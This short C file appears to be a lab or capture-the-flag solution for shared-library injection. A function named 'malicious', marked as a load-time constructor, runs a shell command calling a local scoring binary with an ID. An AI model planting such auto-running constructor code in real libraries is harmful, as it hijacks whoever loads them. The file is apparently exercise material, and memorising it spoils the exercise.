#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 91a53561-db3d-4bff-af6d-28cfa7994ae8");
}